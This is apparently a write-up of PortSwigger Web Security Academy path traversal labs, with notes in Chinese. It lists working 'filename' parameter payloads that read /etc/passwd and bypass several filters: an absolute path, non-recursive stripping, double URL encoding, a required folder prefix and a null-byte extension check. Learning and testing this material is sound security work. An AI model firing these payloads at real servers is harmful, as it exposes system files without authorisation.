[toc]

#### 0. 绕过方式

* `?filename=../../../../../etc/passwd`
* `?filename=/etc/passwd`
* `?filename=....//....//....//etc/passwd`，没有递归删除`../`
* `?filename=..%252f..%252f..%252fetc/passwd`，两次url编码
* `?filename=/var/www/image/../../../etc/passwd`，传递的参数要求以预定的文件夹开始
* `?filename=../../../etc/passwd%00.png`，传递的参数要求以某种后缀结尾

#### 1. File path traversal, simple case

```
https://ac741f4b1e3923b280e1fc40009600fc.web-security-academy.net/image?filename=../../../../../../etc/passwd
```

#### 2. File path traversal, traversal sequences blocked with absolute path bypass

> The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

`/image?filename=/etc/passwd`

#### 3. File path traversal, traversal sequences stripped non-recursively

在使用之前，应用程序从用户提供的文件名中剥离路径遍历序列。但是没有递归删除`../`。

`/image?filename=....//....//....//etc/passwd`

#### 4. File path traversal, traversal sequences stripped with superfluous URL-decode

> The application blocks input containing [path traversal](https://portswigger.net/web-security/file-path-traversal) sequences. It then performs a URL-decode of the input before using it.

先检测了`../`，但是之后又url-decode了一次，那将路径进行两次url编码。

#### 5. File path traversal, validation of start of path

> The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

这里预期的文件夹是`/var/www/image`。

`/image?filename=/var/www/images/../../../etc/passwd`

#### 6. File path traversal, validation of file extension with null byte bypass

传递的参数要求以`.png`后缀结尾。

`/image?filename=../../../etc/passwd%00.png`